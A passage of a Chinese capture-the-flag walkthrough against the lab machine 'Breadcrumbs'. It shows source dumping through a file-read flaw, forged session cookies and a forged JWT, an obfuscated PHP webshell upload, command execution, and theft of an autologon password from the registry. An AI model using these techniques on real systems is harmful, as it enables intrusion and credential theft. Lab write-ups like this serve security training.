"<?php session_start();\r\n$LOGGED_IN = false;\r\nif(isset($_SESSION['loggedIn'])){\r\n    $LOGGED_IN = true;\r\n    require '..\/db\/db.php';\r\n}\r\nelse{\r\n    header(\"Location: ..\/auth\/login.php\");\r\n    die();\r\n}\r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Binary<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/all.css\">\r\n    <\/head>\r\n\r\n    <nav class=\"navbar navbar-default justify-content-end\">\r\n        <div class=\"navbar-header justify-content-end\">\r\n            <button type=\"button\" class=\"navbar-toggle btn btn-outline-info p-3 m-3\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"><i class=\"fas fa-hamburger\"><\/i><\/button>\r\n        <\/div>\r\n\r\n        <div class=\"collapse navbar-collapse justify-content-end mr-5\">\r\n             <ul class=\"navbar-nav\">\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/index.php\"><i class=\"fas fa-home\"><\/i> Home<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"issues.php\"><i class=\"fa fa-check\" aria-hidden=\"true\"><\/i> Issues<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"#\"><i class=\"fa fa-user\" aria-hidden=\"true\"><\/i> User Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"files.php\"><i class=\"fa fa-file\" aria-hidden=\"true\"><\/i> File Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/auth\/logout.php\"><i class=\"fas fa-sign-out-alt\"><\/i> Logout<\/a><\/li>\r\n             <\/ul>\r\n        <\/div>\r\n    <\/nav>\r\n    <body class=\"bg-dark\">\r\n        <main class=\"main text-white\">\r\n            <div class=\"row text-center justify-content-center\">\r\n                <div class=\"col-md-5\">\r\n                    <h1>User Management<\/h1>\r\n                    <p class=\"text-danger\"><i class=\"fas fa-exclamation-circle\"><\/i> Under construction<\/p>\r\n                    <table class=\"table table-dark mx-2\" id=\"noteTable\">\r\n                        <tr>\r\n                            <th>Username<\/th>\r\n                            <th>Age<\/th>\r\n                            <th>Position<\/th>\r\n                        <\/tr>\r\n                        <tbody>\r\n                            <?php\r\n                                include '..\/includes\/usersController.php';\r\n                                foreach($data as $d){\r\n                                    echo '<tr class=\"my-5\" id='.$d['id'].'>';\r\n                                    echo '<td scope=\"row\">'.$d['username'].'<\/td>';\r\n                                    if($d['age'] === 0){\r\n                                        echo '<td scope=\"row\" class=\"text-warning\">-<\/td>';\r\n                                    }\r\n                                    else{\r\n                                        echo '<td scope=\"row\" class=\"text-warning\">'.$d['age'].'<\/td>';\r\n                                    }\r\n                                    if($d['position'] === \"\"){\r\n                                        echo '<td scope=\"row\" class=\"text-danger\">Awaiting approval<\/td>';\r\n                                    }\r\n                                    else{\r\n                                        echo '<td scope=\"row\" class=\"text-warning\">'.$d['position'].'<\/td>';\r\n                                    }\r\n                                ?>\r\n                                <?php } ?>\r\n                            <\/tr>\r\n                        <\/tbody>\r\n                    <\/table>\r\n                <\/div>\r\n            <\/div>\r\n        <\/div>\r\n        <\/main>\r\n\r\n        <?php include \"..\/includes\/footer.php\"; ?>\r\n        <script src=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js\" integrity=\"sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx\" crossorigin=\"anonymous\"><\/script>\r\n        <script type=\"text\/javascript\" src='..\/js\/sixtimes.js'><\/script>\r\n    <\/body>\r\n\r\n\r\n<\/html>\r\n"                                                                                                                                          
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/php/issues.php'
"<?php session_start();\r\n$LOGGED_IN = false;\r\nif(isset($_SESSION['loggedIn'])){\r\n    $LOGGED_IN = true;\r\n    require '..\/db\/db.php';\r\n}\r\nelse{\r\n    header(\"Location: ..\/auth\/login.php\");\r\n    die();\r\n}\r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Binary<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/all.css\">\r\n    <\/head>\r\n\r\n    <nav class=\"navbar navbar-default justify-content-end\">\r\n        <div class=\"navbar-header justify-content-end\">\r\n            <button type=\"button\" class=\"navbar-toggle btn btn-outline-info p-3 m-3\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"><i class=\"fas fa-hamburger\"><\/i><\/button>\r\n        <\/div>\r\n\r\n        <div class=\"collapse navbar-collapse justify-content-end mr-5\">\r\n             <ul class=\"navbar-nav\">\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/index.php\"><i class=\"fas fa-home\"><\/i> Home<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"#\"><i class=\"fa fa-check\" aria-hidden=\"true\"><\/i> Issues<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"users.php\"><i class=\"fa fa-user\" aria-hidden=\"true\"><\/i> User Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"files.php\"><i class=\"fa fa-file\" aria-hidden=\"true\"><\/i> File Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/auth\/logout.php\"><i class=\"fas fa-sign-out-alt\"><\/i> Logout<\/a><\/li>\r\n        <\/div>\r\n    <\/nav>\r\n    <body class=\"bg-dark\">\r\n        <main class=\"main\">\r\n            <div class=\"row justify-content-center\">\r\n                <div class=\"col-sm-1 col-lg-6 mt-5\">\r\n                    <h1 class=\"text-center text-white\">Issues<h1>\r\n                    <?php \r\n                        include '..\/includes\/issuesController.php';\r\n                        if($data !== NULL){?>\r\n                        <table class=\"table table-dark mx-2\" id=\"noteTable\">\r\n                            <thead>\r\n                                <tr class=\"my-5\">\r\n                                    <th scope=\"col\">ID<\/th>\r\n                                    <th scope=\"col\">Type<\/th>\r\n                                    <th scope=\"col\">Description<\/th>\r\n                                    <th scope=\"col\" class=\"text-center\">Nuke it<\/th>\r\n                                <\/tr>\r\n                            <\/thead>\r\n                                <tbody>\r\n                                    <?php\r\n                                        foreach($data as $d){\r\n                                            echo '<tr class=\"my-5\" id='.$d['id'].'>';\r\n                                            echo '<td scope=\"row\">'.$d['id'].'<\/td>';\r\n                                            if($d['title'] === \"URGENT\"){\r\n                                                echo '<td scope=\"row\" class=\"text-warning\">'.$d['title'].'<\/td>';\r\n                                            }\r\n                                            else{\r\n                                                echo '<td scope=\"row\">'.$d['title'].'<\/td>';\r\n                                            }\r\n                                            if($d['title'] === \"URGENT\"){\r\n                                                echo '<td scope=\"row\" class=\"text-warning\">'.$d['description'].'<\/td>';\r\n                                            }\r\n                                            else{\r\n                                                echo '<td scope=\"row\">'.$d['description'].'<\/td>';\r\n                                            }\r\n                                            \r\n                                        ?>\r\n                                            <th scope=\"row\" class=\"text-center\">\r\n                                                <button class=\"btn btn-danger p-2 mx-auto\" onclick='alert(\"Awaiting apporval\")'>\r\n                                                    <i class=\"fas fa-radiation\"><\/i>\r\n                                                <\/button>\r\n                                            <\/th>\r\n                                        <?php } ?>\r\n                                <\/tr>\r\n                                <\/tbody>\r\n                    <?php\r\n                         } else{\r\n                             echo '<hr class=\"bg-white w-50\">';\r\n                             echo '<h5 id=\"statMessage\" class=\"text-center text-white\">Nothing to display now.<\/h5>';\r\n                         }\r\n                         \r\n                    ?>\r\n                    <\/table>\r\n                <\/div>\r\n            <\/div>\r\n        <\/div>\r\n        <\/main>\r\n\r\n        <?php include \"..\/includes\/footer.php\"; ?>\r\n        <script src=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js\" integrity=\"sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx\" crossorigin=\"anonymous\"><\/script>\r\n        <script type=\"text\/javascript\" src='..\/js\/sixtimes.js'><\/script>\r\n    <\/body>\r\n\r\n\r\n<\/html>\r\n"
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/php/files.php'
"<?php session_start();\r\n$LOGGED_IN = false;\r\nif($_SESSION['username'] !== \"paul\"){\r\n    header(\"Location: ..\/index.php\");\r\n}\r\nif(isset($_SESSION['loggedIn'])){\r\n    $LOGGED_IN = true;\r\n    require '..\/db\/db.php';\r\n}\r\nelse{\r\n    header(\"Location: ..\/auth\/login.php\");\r\n    die();\r\n}\r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Binary<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"..\/assets\/css\/all.css\">\r\n    <\/head>\r\n\r\n    <nav class=\"navbar navbar-default justify-content-end\">\r\n        <div class=\"navbar-header justify-content-end\">\r\n            <button type=\"button\" class=\"navbar-toggle btn btn-outline-info p-3 m-3\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"><i class=\"fas fa-hamburger\"><\/i><\/button>\r\n        <\/div>\r\n\r\n        <div class=\"collapse navbar-collapse justify-content-end mr-5\">\r\n             <ul class=\"navbar-nav\">\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/index.php\"><i class=\"fas fa-home\"><\/i> Home<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"issues.php\"><i class=\"fa fa-check\" aria-hidden=\"true\"><\/i> Issues<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"users.php\"><i class=\"fa fa-user\" aria-hidden=\"true\"><\/i> User Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"#\"><i class=\"fa fa-file\" aria-hidden=\"true\"><\/i> File Management<\/a><\/li>\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"..\/auth\/logout.php\"><i class=\"fas fa-sign-out-alt\"><\/i> Logout<\/a><\/li>\r\n             <\/ul>\r\n        <\/div>\r\n    <\/nav>\r\n    <body class=\"bg-dark\">\r\n        <main class=\"main\">\r\n            <div class=\"row justify-content-center text-white text-center\">\r\n                <div class=\"col-md-3\">\r\n                    <h1>Task Submission<\/h1>\r\n                    <p class=\"text-danger\"><i class=\"fas fa-exclamation-circle\"><\/i> Please upload only .zip files!<\/p>\r\n                    <form onsubmit=\"return false\">\r\n                        <div class=\"form-group mt-5\">\r\n                            <input type=\"text\" class=\"form-control\" placeholder=\"Task completed\" id=\"task\" name=\"task\">\r\n                        <\/div>\r\n                        <div class=\"form-group\">\r\n                            <input type=\"file\" class=\"form-control\" placeholder=\"Task\" id=\"file\" name=\"file\">\r\n                        <\/div>\r\n                        <button type=\"submit\" class=\"btn btn-outline-success btn-block py-3\" id=\"upload\">Upload<\/button>\r\n                    <\/form>\r\n                    <p id=\"message\"><\/p>\r\n                <\/div>\r\n            <\/div>\r\n        <\/div>\r\n        <\/main>\r\n\r\n        <?php include \"..\/includes\/footer.php\"; ?>\r\n        <script src=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js\" integrity=\"sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx\" crossorigin=\"anonymous\"><\/script>\r\n        <script type=\"text\/javascript\" src='..\/assets\/js\/files.js'><\/script>\r\n    <\/body>\r\n\r\n\r\n<\/html>\r\n"                             
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s -X POST http://10.129.52.150/includes/bookController.php -d 'method=1&book=../portal/js/sixtimes.js'
<br />
<b>Warning</b>:  file_get_contents(../books/../portal/js/sixtimes.js): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false                                                                                                                                                                                             
```

差不多了解了整个网站的运行逻辑，注册一个普通帐号 `enil` 登录进后台看看。

![](Pasted%20image%2020261009171443.png)

![](Pasted%20image%2020261009171504.png)

![](Pasted%20image%2020261009171537.png)

在 `portal/cookie.php` 中读取到的源码有下面这一段。

```bash
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);
    return $session_cookie;
}
```

对于 `paul` 来说：

1. $max = 4 - 1 = 3；
2. $seed 取值 0、1、2、3；
3. \$key 为 "s4lTy_stR1nG_".字符."(!528./9890";
4. \$session_cookie 为 "paul" + md5(\$key)

所以 Key 有四种可能：

```bash
seed 取到 p  ->  paula2a6a014d3bee04d7df8d5837d62e8c5
seed 取到 a  ->  paul61ff9d4aaefe6bdf45681678ba89ff9d
seed 取到 u  ->  paul8c8808867b53c49777fe5559164708c3
seed 取到 l  ->  paul47200b180ccd6835d25d034eeb6e6390
```

实测正确的为：

```bash
paul47200b180ccd6835d25d034eeb6e6390
```

### JWT

JWT 分为三段，header + payload + signature，用 `.` 连接，每段都是 base64url。

	base64url 是普通 base64 把 +、/ 换成 -、_，去除末尾的 =

header 的写法是固定的，源码里签发 token 用的是 `firebase/php-jwt`，它的 `JWT::encode()` 第一件事就是拼接 header。

```bash
$header = array('typ' => 'JWT', 'alg' => $alg);
```

`$alg` 传的是 HS256，所以 header 的 JSON 是：

```bash
{"typ":"JWT","alg":"HS256"}
```

base64url 之后得到  `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`。

`portal/authConrtoller.php` 里写了：

```bash
$payload = array(
    "data" => array(
        "username" => $username
    ));
$jwt = JWT::encode($payload, $secret_key, 'HS256');
```

把 `$username` 换成 `paul` 得到 payload 是：

```bash
{"data":{"username":"paul"}}
```

base64url 之后得到 `eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ`。

```bash
$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
```

HS256 是对称的算法：签名和验签用同一把钥匙，正常流程下只有服务器知道它，但这里它硬编码在源码里，可以直接读到。

拼接三段得到完整的 JWT 是：

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

修改浏览器的 PHPSESSID 和 jwt，刷新就拿到了 paul。

![](Pasted%20image%2020261009173921.png)

访问 http://10.129.52.150/portal/php/files.php 可以找到文件上传界面。

![](Pasted%20image%2020261009173952.png)

这个是之前找到的文件上传的逻辑：

```bash
formData.append('task', $('#task').val() + ".zip");
```

写一个 PHP 一句话木马。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ cat pwn.php
<?php system($_GET["c"]); ?>
```

尝试上传，但是失败了，报错 `move_uploaded_file`，是文件路径错误了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -sS -i -X POST http://10.129.52.150/portal/includes/fileController.php -b 'PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU' -F 'task=../../pwn.php' -F 'file=@pwn.php'
HTTP/1.1 200 OK
Date: Fri, 09 Oct 2026 08:44:17 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 534
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  move_uploaded_file(C:\Users\www-data\Desktop\xampp\tmp\php61FA.tmp): Failed to open stream: Invalid argument in <b>C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php</b> on line <b>25</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move &quot;C:\Users\www-data\Desktop\xampp\tmp\php61FA.tmp&quot; to &quot;../uploads/../../pwn.php&quot; in <b>C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php</b> on line <b>25</b><br />
Missing file or title :(                                                                                                                                                                          
```

找到相关源码：

```bash
$uploads_dir = '../uploads';
move_uploaded_file($tmp_name, "$uploads_dir/$name");
```

修改请求再次尝试上传，还是失败了，问题不在目标路径上。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -sS -i -X POST http://10.129.52.150/portal/includes/fileController.php -b 'PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU' -F 'task=pwn.php' -F 'file=@pwn.php'
HTTP/1.1 200 OK
Date: Fri, 09 Oct 2026 08:48:03 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 528
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  move_uploaded_file(C:\Users\www-data\Desktop\xampp\tmp\phpD6BF.tmp): Failed to open stream: Invalid argument in <b>C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php</b> on line <b>25</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move &quot;C:\Users\www-data\Desktop\xampp\tmp\phpD6BF.tmp&quot; to &quot;../uploads/pwn.php&quot; in <b>C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php</b> on line <b>25</b><br />
Missing file or title :(                                                                                                                                                                          
```

说不定是把木马过滤了，换一个写法，将函数名拆开、改成从 `$_SERVER` 后取参数。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ cat v1.php
<?php $f="sys"."tem";$f(urldecode($_SERVER["QUERY_STRING"])); ?>                                                                                                                                  
```

上传新的 payload，通过了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -sS --max-time 15 -X POST http://10.129.53.45/portal/includes/fileController.php -b 'PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU' -F 'task=v1.php' -F 'file=@v1.php'
Success. Have a great weekend!                                                                                                              
```

执行 whoami，成功了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 "http://10.129.53.45/portal/uploads/v1.php?whoami"
breadcrumbs\www-data
```

执行命令 `region query Winlogon`，在注册表的自动登录项里找到了 www-data 的明文密码 `QNxH2vi01X` 。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 "http://10.129.53.45/portal/uploads/v1.php?reg+query+%22HKLM%5CSOFTWARE%5CMicrosoft%5CWindows+NT%5CCurrentVersion%5CWinlogon%22+2%3E%261"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0xc977dd97
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-3217272714-4136315898-3467882831-1004
    LastUsedUsername    REG_SZ    www-data
    DefaultPassword    REG_SZ    QNxH2vi01X
    DefaultUserName    REG_SZ    www-data
    AutoAdminLogon    REG_SZ    1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

使用 sshpass 登录 www-data。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]                                                                                                                                                         
└─$ sshpass -p 'QNxH2vi01X' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null www-data@10.129.53.45                                                                                 
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.                                                                                                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.                                                                                                                        
** This session may be vulnerable to "store now, decrypt later" attacks.                                                                                                                          
** The server may need to be upgraded. See https://openssh.com/pq.html                                                                                                                            
Microsoft Windows [Version 10.0.19041.746]                                                                                                                                                        
(c) 2020 Microsoft Corporation. All rights reserved.

www-data@BREADCRUMBS C:\Users\www-data>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\www-data> whoami
breadcrumbs\www-data

```

查看权限。

```bash
PS C:\Users\www-data> hostname
Breadcrumbs           
PS C:\Users\www-data> whoami /priv

PRIVILEGES INFORMATION                                                    
----------------------                                                    
                                                                          
Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

枚举发现 `cookiesrunner.bat`。

```bash
PS C:\Users\www-data\Desktop> dir


    Directory: C:\Users\www-data\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/8/2021  11:41 PM                usefull_cookies
d-----          2/8/2021   5:53 AM                xampp
-a----          2/8/2021  11:38 PM            146 cookiesrunner.bat
-a----          2/8/2021   5:14 AM           1450 Microsoft Edge.lnk


PS C:\Users\www-data\Desktop> type .\cookiesrunner.bat
@echo off

del C:\Users\www-data\Desktop\usefull_cookies\*
copy C:\Users\www-data\Desktop\usefull_cookies\* C:\Users\www-data\Desktop\xampp\tmp

```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> dir


    Directory: C:\Users\www-data\Desktop\usefull_cookies


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          2/8/2021  10:12 PM             60 sess_oliviaaa0aa8b0e94759562a5854d69b9e6b79


PS C:\Users\www-data\Desktop\usefull_cookies> type .\sess_oliviaaa0aa8b0e94759562a5854d69b9e6b79
username|s:6:"olivia";loggedIn|b:1;role|s:12:"Data Analyst";

```

使用 netstat 发现有一个绑定本地的高位端口 1234。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2872   
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       7604
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       7604
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2748
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6080
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       7568
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1056
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1444
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2552
  TCP    10.129.53.45:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       2804
  TCP    [::]:22                [::]:0                 LISTENING       2872
  TCP    [::]:80                [::]:0                 LISTENING       7604
  TCP    [::]:135               [::]:0                 LISTENING       912
  TCP    [::]:443               [::]:0                 LISTENING       7604
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       2748
  TCP    [::]:7680              [::]:0                 LISTENING       7568
  TCP    [::]:49664             [::]:0                 LISTENING       680
  TCP    [::]:49665             [::]:0                 LISTENING       524
  TCP    [::]:49666             [::]:0                 LISTENING       1056
  TCP    [::]:49667             [::]:0                 LISTENING       1444
  TCP    [::]:49668             [::]:0                 LISTENING       660
  TCP    [::]:49669             [::]:0                 LISTENING       2552
```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> tasklist /v /fi "pid eq 2804"
ERROR: Access denied
PS C:\Users\www-data\Desktop\usefull_cookies> tasklist /svc /fi "pid eq 2804"
ERROR: Access denied

```

反查发现这是一个叫 passman 的服务。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 "http://10.129.53.45/portal/uploads/v1.php?tasklist+/svc+/fi+%22pid+eq+2804%22+2%3E%261"

Image Name                     PID Services
========================= ======== ============================================
httpd.exe                     2804 passman
```

回看 portal 的任务列表，有一条工单提示要在所有机器上装好密码管理器。

```bash
"Finish installing **password managers** on all computers"_
```

反查 passman，发现它属于 LocalSystem。

```bash
